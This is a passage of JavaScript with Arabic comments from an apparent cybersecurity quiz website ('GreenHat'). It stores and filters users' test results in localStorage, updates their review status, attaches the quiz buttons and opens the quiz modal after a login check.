     * الحصول على نتائج اختبارات المستخدمين
     * @returns {Array} - قائمة نتائج الاختبارات
     */
    getUserTestResults() {
        const testResultsData = localStorage.getItem('greenhat_test_results');
        return testResultsData ? JSON.parse(testResultsData) : [];
    }

    /**
     * الحصول على نتائج اختبارات مستخدم محدد
     * @param {string} userId - معرف المستخدم
     * @returns {Array} - قائمة نتائج اختبارات المستخدم
     */
    getUserTestResultsByUserId(userId) {
        const testResults = this.getUserTestResults();
        return testResults.filter(result => result.userId === userId);
    }

    /**
     * تحديث حالة مراجعة نتيجة اختبار
     * @param {string} resultId - معرف نتيجة الاختبار
     * @param {boolean} reviewed - حالة المراجعة
     */
    updateTestResultReviewStatus(resultId, reviewed) {
        // الحصول على نتائج الاختبارات الحالية
        const testResults = this.getUserTestResults();

        // البحث عن نتيجة الاختبار
        const resultIndex = testResults.findIndex(result => result.id === resultId);

        if (resultIndex !== -1) {
            // تحديث حالة المراجعة
            testResults[resultIndex].reviewed = reviewed;

            // حفظ نتائج الاختبارات
            localStorage.setItem('greenhat_test_results', JSON.stringify(testResults));

            console.log('تم تحديث حالة مراجعة نتيجة الاختبار:', resultId, reviewed);

            return true;
        }

        return false;
    }
}

// إنشاء كائن من نظام اختبار الأمن السيبراني
const securityChallenge = new SecurityChallenge();

// تهيئة نظام الاختبار عند تحميل الصفحة
document.addEventListener('DOMContentLoaded', () => {
    // تهيئة نظام اختبار الأمن السيبراني

    // إضافة مستمع لزر بدء الاختبار
    const startChallengeBtn = document.getElementById('start-challenge-btn');
    if (startChallengeBtn) {
        // إضافة مستمع حدث لزر بدء الاختبار
        startChallengeBtn.addEventListener('click', function() {
                securityChallenge.startChallenge();
        });
    } else {
        // لم يتم العثور على زر بدء الاختبار
    }

    // إضافة مستمع لزر التالي
    const nextChallengeBtn = document.getElementById('next-challenge-btn');
    if (nextChallengeBtn) {
        // إضافة مستمع حدث لزر التالي
        nextChallengeBtn.addEventListener('click', function() {

            securityChallenge.nextChallenge();
        });
    } else {
        // لم يتم العثور على زر التالي
    }
});

/**
 * فتح نافذة اختبار الأمن السيبراني
 */
function openSecurityChallenge() {
    // فتح نافذة اختبار الأمن السيبراني

    // التحقق من تسجيل دخول المستخدم
    if (typeof membershipSystem !== 'undefined' && typeof membershipSystem.isLoggedIn === 'function') {
        if (!membershipSystem.isLoggedIn()) {
            showToast('يرجى تسجيل الدخول أولاً للوصول إلى الاختبار', 'warning');
            return;
        }
    } else {
        showToast('حدث خطأ في نظام العضوية', 'error');
        // نظام العضوية غير متاح أو الدالة isLoggedIn غير موجودة
        return;
    }

    try {
        // عرض نافذة الاختبار
        const securityChallengeModal = document.getElementById('security-challenge-modal');
        if (securityChallengeModal) {
            const bsModal = new bootstrap.Modal(securityChallengeModal);
            bsModal.show();
            // تم فتح نافذة اختبار الأمن السيبراني بنجاح

            // إعادة تعيين واجهة الاختبار
            const challengeContainer = document.getElementById('challenge-container');
            const challengeResult = document.getElementById('challenge-result');
            const startScreen = document.getElementById('challenge-start-screen');
            const questionsScreen = document.getElementById('challenge-questions-screen');

            if (challengeContainer) challengeContainer.style.display = 'block';
            if (challengeResult) challengeResult.style.display = 'none';
            if (startScreen) startScreen.style.display = 'block';
            if (questionsScreen) questionsScreen.style.display = 'none';
        } else {
            // لم يتم العثور على عنصر security-challenge-modal
            showToast('حدث خطأ أثناء محاولة فتح نافذة اختبار الأمن السيبراني', 'error');
        }
    } catch (error) {
        // حدث خطأ أثناء فتح نافذة اختبار الأمن السيبراني
        showToast('حدث خطأ أثناء محاولة فتح نافذة اختبار الأمن السيبراني', 'error');
    }
}
